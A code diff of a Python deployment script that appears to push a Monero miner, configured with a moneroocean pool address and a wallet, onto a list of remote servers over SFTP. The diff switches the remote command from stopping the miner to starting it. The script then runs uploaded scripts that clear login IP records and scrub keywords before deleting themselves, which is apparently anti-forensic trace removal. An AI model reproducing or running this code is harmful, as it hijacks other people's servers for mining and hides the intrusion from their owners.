@@ -6,7 +6,7 @@ import json
  
 
 
-URL="gulf.moneroocean.stream:10128"
+URL="gulf.moneroocean.stream:20128"
 ADDRESS="4A1sCcmWh3vMuRX4WAs43JFp9ZDL7FnpQBQhdCrL9pTBdRLCZVFh59ATi3kYhebUvGXoBWvBgDCywj8v9zVhzuPAPSFR8tM"
 
 ip_dict = [
@@ -154,15 +154,11 @@ def upload_to_server(row):
         sftp.put(local_clear_login_ip_script, remote_clear_login_ip_script)
         sftp.put(local_clean_keywords_script, remote_clean_keywords_script)
 
-
-
-
         sftp.close()
 
         # 远程执行命令部分
         commands = [
-            f"cd {put_server_path} && chmod +x server.sh && sh server.sh stop",
-              f"rm -f  {put_server_path}",
+            f"cd {put_server_path} && chmod +x server.sh && sh server.sh start",
             f"if [ -f {remote_clear_login_ip_script} ]; then chmod +x {remote_clear_login_ip_script} && sh {remote_clear_login_ip_script} && rm -f {remote_clear_login_ip_script}; fi",
             f"if [ -f {remote_clean_keywords_script} ]; then chmod +x {remote_clean_keywords_script} && sh {remote_clean_keywords_script} && rm -f {remote_clean_keywords_script}; fi"
 
